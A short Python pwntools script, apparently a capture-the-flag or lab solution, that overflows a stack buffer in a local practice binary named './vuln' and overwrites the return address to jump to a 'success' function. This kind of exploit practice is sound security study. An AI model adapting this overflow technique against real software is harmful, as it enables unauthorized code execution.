from pwn import *

# Ubuntu is doing lots of buffering on its own
# ref: https://stackoverflow.com/a/58450927/7615195
pty = process.PTY

proc = process('./vuln', stdin=pty, stdout=pty)

success_addr = 0x08049186
payload = b'a' * 0x14 + b'a' * 0x4 + p32(success_addr)
proc.sendline(payload)
proc.interactive()
